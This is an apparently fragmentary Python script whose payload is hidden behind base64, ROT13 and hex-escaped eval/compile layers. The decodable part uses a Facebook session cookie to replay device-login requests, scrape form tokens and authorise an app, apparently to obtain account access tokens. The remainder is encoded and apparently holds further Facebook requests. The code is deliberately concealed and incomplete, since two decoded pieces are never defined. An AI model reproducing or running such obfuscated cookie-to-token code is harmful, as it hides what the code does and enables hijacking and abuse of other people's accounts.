god = 'b20vZGV2aWNlP3VzZXJfY29kZT17Y29kZX0nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAndmktVk4sdmk7cT0wLjksZnItRlI7cT0wLjgsZnI7cT0wLjcsZW4tVVM7cT0wLjYsZW47cT0wLjUnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjb29raWUnOiBjb29raWVfZmINCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBkYXRhID0gew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdmYl9kdHNnJzogZmJfZHRzZywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnamF6b2VzdCc6IGphem9lc3QsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3FyJzogcXIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3VzZXJfY29kZSc6IGNvZGUNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB1cmxfYyA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9kZXZpY2UvcmVkaXJlY3QvJywgaGVhZGVycz1oZWFkZXJzLCBkYXRhPWRhdGEpLnVybA0KICAgICAgICAgICAgICAgIHVybF9mID0gdW5xdW90ZSh1cmxfYykuc3BsaXQoJyZuZXh0PScpWzFdDQogICAgICAgICAgICAgICAgaGVhZGVycyA9IHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnSG9zdCc6ICdtYmFzaWMuZmFjZWJvb2suY29tJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICd1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzJzogJzEnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdzYXZlLWRhdGEnOiAnb24nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMTsgUmVkbWkgTm90ZSA4IFBybykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkyLjAuNDUxNS4xMTUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdhY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnc2FtZS1vcmlnaW4nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdzZWMtZmV0Y2gtbW9kZSc6ICduYXZpZ2F0ZScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3NlYy1mZXRjaC11c2VyJzogJz8xJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnc2VjLWZldGNoLWRlc3QnOiAnZG9jdW1lbnQnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdzZWMtY2gtdWEnOiAnIkNocm9taXVtIjt2PSI5MiIsICIgTm90IEE7QnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjkyIicsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzEnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdyZWZlcmVyJzogZidodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vZGV2aWNlP3VzZXJfY29kZT17Y29kZX0nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAndmktVk4sdmk7cT0wLjksZnItRlI7cT0wLjgsZnI7cT0wLjcsZW4tVVM7cT0wLjYsZW47cT0wLjUnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjb29raWUnOiBjb29raWVfZmINCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBmaW5kX2RhdGEgPSByZXF1ZXN0cy5nZXQodXJsX2YsIGhlYWRlcnM9aGVhZGVycykudGV4dA0KICAgICAgICAgICAgICAgIGZiX2R0c2cgPSBmaW5kX2RhdGEuc3BsaXQoJ25hbWU9ImZiX2R0c2ciIHZhbHVlPSInKVsxXS5zcGxpdCgnIiBhdXRvY29tcGxldGU9Im9mZiInKVswXQ0KICAgICAgICAgICAgICAgIHNjb3BlID0gZmluZF9kYXRhLnNwbGl0KCduYW1lPSJzY29wZSIgdmFsdWU9IicpWzFdLnNwbGl0KCciJylbMF0NCiAgICAgICAgICAgICAgICBqYXpvZXN0ID0gZmluZF9kYXRhLnNwbGl0KCduYW1lPSJqYXpvZXN0IiB2YWx1ZT0iJylbMV0uc3BsaXQoJyIgYXV0b2NvbXBsZXRlPSJvZmYiJylbMF0NCiAgICAgICAgICAgICAgICBsb2dnZXJfaWQgPSBmaW5kX2RhdGEuc3BsaXQoJ25hbWU9ImxvZ2dlcl9pZCIgdmFsdWU9IicpWzFdLnNwbGl0KCciJylbMF0NCiAgICAgICAgICAgICAgICB1c2VyX2NvZGUgPSBmaW5kX2RhdGEuc3BsaXQoJ25hbWU9InVzZXJfY29kZSIgdmFsdWU9IicpWzFdLnNwbGl0KCciJylbMF0NCiAgICAgICAgICAgICAgICBlbmNyeXB0ZWRfcG9zdF9ib2R5ID0gZmluZF9kYXRhLnNwbGl0KCduYW1lPSJlbmNyeXB0ZWRfcG9zdF9ib2R5IiB2YWx1ZT0iJylbMV0uc3BsaXQoJyInKVswXQ0KICAgICAgICAgICAgICAgIGhlYWRlcnMgPSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0hvc3QnOiAnbWJhc2ljLmZhY2Vib29rLmNvbScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhY2hlLWNvbnRyb2wnOiAnbWF4LWFnZT0wJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnb3JpZ2luJzogJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgS2l3aSBDaHJvbWUvNjguMC4zNDM4LjAgU2FmYXJpLzUzNy4zNicsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAncmVmZXJlcic6IHVybF9mLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAndmktVk4sdmk7cT0wLjksZnItRlI7cT0wLjgsZnI7cT0wLjcsZW4tVVM7cT0wLjYsZW47cT0wLjUnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjb29raWUnOiBjb29raWVfZmINCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBkYXRhID0gew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdmYl9kdHNnJzogZmJfZHRzZywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnamF6b2VzdCc6IGphem9lc3QsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2Zyb21fcG9zdCc6ICcxJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZGVkdXBsaWNhdGUnOiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbGlua19jdXN0b21lcl9hY2NvdW50JzogJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3JlYWQnOiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbGlua19uZXdzX3N1YnNjcmlwdGlvbic6ICcnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3cml0ZSc6ICcnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdleHRlbmRlZCc6ICcnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjb25maXJtJzogJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3JlYXV0aG9yaXplJzogJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3VzZXJfbWVzc2VuZ2VyX2NvbnRhY3QnOiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnc2Vlbl9zY29wZXMnOiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAncmVzcG9uc2VfdHlwZSc6ICdjb2RlJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnYXV0aF90eXBlJzogJ3JlcmVxdWVzdCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2F1dGhfbm9uY2UnOiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FsbGluZ19wYWNrYWdlX2tleSc6ICcnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdkZWZhdWx0X2F1ZGllbmNlJzogJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2RpYWxvZ190eXBlJzogJ2dkcF92NCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2ZiYXBwX3ByZXMnOiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAncmV0JzogJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3JldHVybl9mb3JtYXQnOiAnY29kZScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2RvbWFpbic6ICcnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdzY29wZSc6IHNjb3BlLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdzc29fZGV2aWNlJzogJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2xvZ2dlcl9pZCc6IGxvZ2dlcl9pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnc2hlZXRfbmFtZSc6ICdpbml0aWFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZmFsbGJhY2tfcmVkaXJlY3RfdXJpJzogJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3Nkayc6ICcnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdmYWNlYm9va19zZGtfdmVyc2lvbic6ICcnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdzZGtfdmVyc2lvbic6ICcnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICd1c2VyX2NvZGUnOiB1c2VyX2NvZGUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2xvZ2dlZF9vdXRfYmVoYXZpb3InOiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaW5zdGFsbF9ub25jZSc6ICcnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdsX25vbmNlJzogJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ29yaWdpbmFsX3JlZGlyZWN0X3VyaSc6ICcnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdsb3lhbHR5X3Byb2dyYW1faWQnOiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbWVzc2VuZ2VyX3BhZ2VfaWQnOiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAncmVzZXRfbWVzc2VuZ2VyX3N0YXRlJzogJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FpZCc6ICcnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdkZWZlcnJlZF9yZWRpcmVjdF91cmknOiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY29kZV9yZWRpcmVjdF91cmknOiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXh0cmFzJzogJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3RwJzogJ3Vuc3BlY2lmaWVkJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZnhfYXBwJzogJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lzX3Byb21vdGVfYXV0aCc6ICcnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbmNyeXB0ZWRfcG9zdF9ib2R5JzogZW5j'
destiny = 'payjqTIxK3Oip3EsLz9xrFjAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNaL2W0WmbtWlpfQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtW19sD09BExyFGI9sWmbtW1Ec4od/pPg04ohyLlpAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVU0APvNtVPNtVPNtVPNtVPNtVPOxolN9VUWypKIyp3EmYaOip3DbW2u0qUOmBv8ioJWup2ywYzMuL2Ivo29eYzAioF92Zv4jY2EcLJkiMl9iLKI0nP9wo25znKWgYlpfVTuyLJEypaZ9nTIuMTIlpljtMTS0LG1xLKEuXD0XVPNtVPNtVPNtVPNtVPNtVUIloS96VQ0tqJ5kqJ90MFuxol51pzjcYaAjoTy0XPqhMKu0CFpcJmSqQDbtVPNtVPNtVPNtVPNtVPNtnTIuMTIlplN9VUfAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNaFT9mqPp6VPqgLzSmnJZhMzSwMJWio2fhL29gWljAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNap2IwYJAbYKIuWmbtWlWQnUWioJy1oFV7qw0vBGVvYPNvVR5iqPOOB0WlLJ5xVwg2CFV5BFVfVPWUo29aoTHtD2ulo21yVwg2CFV5ZvVaYN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPqmMJZgL2tgqJRgoJ9vnJkyWmbtWm8kWljAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNap2S2MF1xLKEuWmbtW29hWljAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNaqKOapzSxMF1coaAyL3IlMF1lMKS1MKA0plp6VPpkWljAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNaqKAypv1uM2IhqPp6VPqAo3ccoTkuYmHhZPNbGTyhqKt7VRShMUWinJDtZGR7VSWyMT1cVR5iqTHtBPODpz8cVRSjpTkyI2IvF2y0YmHmAl4mAvNbF0uHGHjfVTkcn2HtE2Iwn28cVRAbpz9gMF85Zv4jYwD1ZGHhZGR1VR1iLzyfMFOGLJMupzxiAGZ3YwZ2WljAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNaLJAwMKO0WmbtW3EyrUDinUEgoPkupUOfnJAuqTyiov94nUEgoPg4oJjfLKOjoTywLKEco24irT1fB3R9ZP45YTygLJqyY2S2nJLfnJ1uM2Hiq2IvpPkcoJSaMF9upT5aYPbiXwgkCGNhBPkupUOfnJAuqTyiov9mnJqhMJDgMKuwnTShM2H7qw1vZmgkCGNhBFpfQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtW3AyLl1zMKEwnP1mnKEyWmbtW25iozHaYN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPqmMJZgMzI0L2tgoJ9xMFp6VPqhLKMcM2S0MFpfQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtW3AyLl1zMKEwnP11p2IlWmbtWm8kWljAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNap2IwYJMyqTAbYJEyp3DaBvNaMT9wqJ1yoaDaYN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPquL2AypUDgoTShM3IuM2HaBvNaqzxgIx4fqzx7pG0jYwxfMaVgEyV7pG0jYwtfMaV7pG0jYwpfMJ4gIIZ7pG0jYwLfMJ47pG0jYwHaYN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPqwo29enJHaBvOwo29enJIsMzVAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVU0APvNtVPNtVPNtVPNtVPNtVPOxo24tCFOlMKS1MKA0pl5aMKDbqKWfK3bfVTuyLJEypaZ9nTIuMTIlplxAPvNtVPNtVPNtVPNtVPNtVPOvpzIunj0XVPNtVPNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVPNtVPNtVTAioaEcoaIyQDbtVPNtVPNtVN0XVPNtVPNtVPOxpzy2MKVhMKuyL3I0MI9mL3WcpUDbVvVvMT9wqJ1yoaDhpKIypayGMJkyL3EipvtaJ2EuqTRgLJA0nJ9hCFW2MKWcMaxgoT9anJ4vKFpcYzAfnJAeXPxvVvVcB3AfMJIjXQtcQDbtVPNtVPNtVTAen2ftCFOoKD0XVPNtVPNtVPOfnKAsL2ftCFOoKD0XVPNtVPNtVPOzo3VtrPOcovOxpzy2MKVhM2I0K2Aio2gcMKZbXGbAPvNtVPNtVPNtVPNtVTAen2fhLKOjMJ5xXUuoW25uoJHaKFfvCFVerSfaqzSfqJHaKFxAPvNtVPNtVPNtL2ftCFNaBlphnz9covuwn2geXFfaBlpAPvNtVPNtVPNtoTymK2AeYzSjpTIhMPuwnlxAPvNtVPNtVPNtL29enJIgL24tCFOfnKAsL2goZS0APvNtVPNtVPNtnTIuMTIlp2RtCFO7QDbAPvNtVPNtVPNtW3ImMKVgLJqyoaDaBvO1p2IlYN0XVPNtVPNtVPNaL29in2yyWmbtL29enJIgL24APvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVU0APvNtVPNtVPNtM8BcqTy0MJgyrG0tpzIkqJImqUZhM2I0XPqbqUEjpmbiY3q3ql5gLJAbnJ5yYJkcn2IlYzAioF92MKWcMaxiWlkbMJSxMKWmCJuyLJEypaAuXF50MKu0QDbAPvNtVPNtVPNtp2y0MJgyrI8lVQ0tM8BcqTy0MJgyrF5mpTkcqPtaMTS0LF1mnKEyn2I5CFVaXIfkKF5mpTkcqPtaVvpcJmOqQDbtVPNtVPNtVTElnKMypv5kqJy0XPxAPvNtVPNtVPNtpUWcoaDbVfFDLJ5aVSEc4od/ovOVj6OhnPOJkeQuh6A0VRAupUEwnTRvYTIhMQ0aKUVaXD0XVPNtVPNtVPOxLKEuL2SjqTAbLFN9VTqcLJywLKO0L2uuXPqbqUEjpmbiY3q3ql5gLJAbnJ5yYJkcn2IlYzAioF92MKWcMaxiWljtp2y0MJgyrI8lYPOupTyeMKxcQDbtVPNtVPNtVUOlnJ50XPWJkeQuh6A0VRAupUEwnTRtITwQbT5bVRCQgT5aYv4hYvVfMJ5xCFqppvpcQDbtVPNtVPNtVTEuqTS2qJ90L2SjVQ0trj0XVPNtVPNtVPNaMl1lMJAupUEwnTRgpzImpT9hp2HaBvOxLKEuL2SjqTAbLD0XVPNtVPNtVPO9QDbtVPNtVPNtVTqcLJywLKO0VQ0tpzIkqJImqUZhpT9mqPtanUE0pUZ6Yl93q3phoJSwnTyhMF1fnJgypv5wo20iqzIlnJM5YlpfMTS0LG1xLKEuqaIiqTAupPkbMJSxMKWmCJuyLJEypaAuXD0XVPNtVPNtVPO3nTyfMFOHpaIyBt0XVPNtVPNtVPNtVPNtVPNtVTR9pzIkqJImqUZhpT9mqPtvnUE0pUZ6Yl93q3phoJSwnTyhMF1fnJgypv5wo20iLKOcY2qyqP1jo3A0YJyhMz8iVvjtnTIuMTIlpm17Vxuip3DvBvW3q3phoJSwnTyhMF1fnJgypv5wo20vYPW4YKWypKIyp3EyMP13nKEbVwbvJR1ZFUE0pSWypKIyp3DvYPW1p2IlYJSaMJ50Vwc1p2IlYPWipzyanJ4vBvWbqUEjpmbiY3q3ql5gLJAbnJ5yYJkcn2IlYzAioFVfVzAioaEyoaDgqUyjMFV6VzSjpTkcL2S0nJ9hY3tgq3q3YJMipz0gqKWfMJ5wo2EyMQftL2uupaAyqQ1IIRLgBPVfVaWyMzIlMKVvBvWbqUEjpmbiY3q3ql5gLJAbnJ5yYJkcn2IlYzAioF9uqKEiYKWyLJA0nJ9hpl8vYPWwo29enJHvBzAesFkxLKEuCKfvqKWfVwc1pzk9XD0XVPNtVPNtVPNtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtnJD9LF5dp29hXPyoVaOip3DvKIfvnJDvKD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOmqQ1uYzcmo24bXIfvpT9mqPWqJlWmqT9lrFWqQDbtVPNtVPNtVPNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVPNtVPNtVPNtVPOvpzIunj0XVPNtVPNtVPNtVPNtVPNtVUIloQR9MvWbqUEjpmbiY3q3ql5gLJAbnJ5yYJkcn2IlYzAioF9mMJ5xYKWyLJA0nJ9hpl8/pT9mqS9cMQ17nJE9WaA0o3W5CKgmqU0vQDbtVPNtVPNtVPNtVPNtVPNtLG1lMKS1MKA0pl5aMKDbqKWfZFkbMJSxMKWmCKfvFT9mqPV6Vaq3ql5gLJAbnJ5yYJkcn2IlYzAioFVfVatgpzIkqJImqTIxYKqcqTtvBvWLGHkVqUEjHzIkqJImqPVfVaImMKVgLJqyoaDvBaImMKVfVz9lnJqcovV6Vzu0qUOmBv8iq3q3Yz1uL2ucozHgoTyeMKVhL29gVvjvL29hqTIhqP10rKOyVwbvLKOjoTywLKEco24irP13q3pgMz9loF11pzkyozAiMTIxBlOwnTSlp2I0CIIHEv04VvjvpzIzMKWypvV6Vzu0qUOmBv8iq3q3Yz1uL2ucozHgoTyeMKVhL29gY2S1qT8gpzIuL3Eco25mYlVfVzAio2gcMFV6L2g9XD0XVPNtVPNtVPNtVPNtVPNtVT9vnw1uYaEyrUDhp3OfnKDbW25uoJH9Vz9vnzIwqS9cMPVtqzSfqJH9VvpcJmSqYaAjoTy0XPpvWlyoZS0APvNtVPNtVPNtVPNtVPNtVPOxCGNAPvNtVPNtVPNtVPNtVPNtVPNAPvNtVPNtVPNtVPNtVPNtVPOvqJMzMw1lMKS1MKA0pl5jo3A0XPWbqUEjpmbiY3q3ql5gLJAbnJ5yYJkcn2IlYzAioF9upTxip2IhMP1lMJSwqTyioaZiVvkbMJSxMKWmCKfvFT9mqPV6Vaq3ql5gLJAbnJ5yYJkcn2IlYzAioFVfVatgpzIkqJImqTIxYKqcqTtvBvWLGHkVqUEjHzIkqJImqPVfVaImMKVgLJqyoaDvBaImMKVfVz9lnJqcovV6Vzu0qUOmBv8iq3q3Yz1uL2ucozHgoTyeMKVhL29gVvjvL29hqTIhqP10rKOyVwbvLKOjoTywLKEco24irP13q3pgMz9loF11pzkyozAiMTIxBlOwnTSlp2I0CIIHEv04VvjvpzIzMKWypvV6Vzu0qUOmBv8iq3q3Yz1uL2ucozHgoTyeMKVhL29gY2S1qT8gpzIuL3Eco25mYlVfVzAio2gcMFV6L2g9YTEuqTR9rlWiLzcyL3EsnJDvBz9vnvjvpzIuL3Eco25mVwc0rKOyYPWfnJ1cqPV6VwR1ZPW9XD0XVPNtVPNtVPNtVPNtVPNtVTyzVPWcozMiVvOcovOvqJMzMv50MKu0Bt0XVPNtVPNtVPNtVPNtVPNtVPNtVPOwo25aCJW1MzMzYzcmo24bXIfvnJ5zolWqJlWgMKAmLJqyVy0hp3OfnKDbVvNvXIfjKD0XVPNtVPNtVPNtVPNtVPNtVPNtVPO0o25aCJW1MzMzYzcmo24bXIfvnJ5zolWqJlW0o3EuoS9lMJSwqTyioaZvKD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOzpz9gVTEuqTI0nJ1yVTygpT9lqPOxLKEyqTygMD0XVPNtVPNtVPNtVPNtVPNtVPNtVPO0CJEuqTI0nJ1yYz5iqltcYaA0pzM0nJ1yXPpyFQbyGGbyHlpcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVUA0qPN9VUA0qPfkQDbtVPNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50XTLvKQNmZ1fjBmx1oIgpZQZmJmR7BGAgr3A0qU1pZQZmJmN7BGIgKIjjZmAoZGf5A20tGzuuovOpZQZmJmR7BGqgGzqbnJRtKQNmZ1fkBmx2orXKwlOpZQZmJmR7BGAgr3E9VSjjZmAoZGf5Az3vy48tKQNmZ1fkBmx3oKgcMU0tKQNmZ1fkBmx2orXKwlOpZQZmJmR7BGqgKQNmZ1fkBmxmoKgwo25asFOpZQZmJmR7BGWgHzIuL3Eco25mVSjjZmAoZGf5Az3vy48tKQNmZ1fkBmx3oIGuh5IhMmbtKQNmZ1fkBmxloKg0o25asFOpZQZmJmR7BGAgHzIuL3Eco25mVvxAPvNtVPNtVPNtVPNtVPNtVPOyoUAyBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPO0CJEuqTI0nJ1yYz5iqltcYaA0pzM0nJ1yXPpyFQbyGGbyHlpcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50XTLvVSjjZmAoZGf5ZJ1PqJMzVSEb4odyqPOP4odunFjtr2W1MzMzYaEyrUE9VPRuVvxAPvNtVPNtVPNtVPNtVPNtVPOzo3VtqTxtnJ4tpzShM2HbAwRjVPjtZPjtYGRcBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPuzW1jjZmAoZGf5A23vy4ttKQNmZ1fkBmZ1oIgpZQZmJmR7BGAgsSjjZmAoZGfmZJ1qVSjjZmAoZQfmAz1JqJxtGZBlozptkWQuh6AcVUg0nK0tE2aQbaxtVPpfMJ5xCFqppvpcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVUAfMJIjXQNhZwNjXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPuzWlNtKQNmZ1fkBmZkoIgpZQZmJmR7BGWgY1jjZmAoZGfmAJ1qVSjjZmAoZQfmAz1JqJxtGZBlozptkWQuh6AcVUg0nK0tE2aQbaxtVPpfMJ5xCFqppvpcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVUAfMJIjXQNhZwNjXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPuzW1jjZmAoZGf5Az3vy4ttKQNmZ1fkBmZ1oIgpZQZmJmN7ZmMgYIjjZmAoZGfmZJ1qVSjjZmAoZQfmAz1JqJxtGZBlozptkWQuh6AcVUg0nK0tE2aQbaxtVPpfMJ5xCFqppvpcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVUAfMJIjXQNhZwNjXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPuzWlNtKQNmZ1fkBmZkoIgpZQZmJmR7ZmIgKSkpZQZmJmR7ZmIgKFOpZQZmJmN7ZmMgIaIcVRmQfz5aVZFD4ohwnFO7qTy9VRqcj6W5VPNaYTIhMQ0aKUVaXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOmoTIypPtjYwVjZPxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDbMvqpZQZmJmR7BGMg4crVVSjjZmAoZGfmAJ1oKQNmZ1fjBmZ2oF1pZQZmJmR7ZmSgKFOpZQZmJmN7ZmMgIaIcVRmQfz5aVZFD4ohwnFO7qTy9VRqcj6W5VPNaYTIhMQ0aKUVaXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOmoTIypPtjYwVjZPxtQDbAPvNtVPNAPzMipvOcVTyhVUWuozqyXUAioUIiozpcBt0XPDyenT9cqTSiVQ0tqTulMJSxnJ5aYyEbpzIuMPu0LKWaMKD9L2uurFkupzqmCFucYPxcYaA0LKW0XPx='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
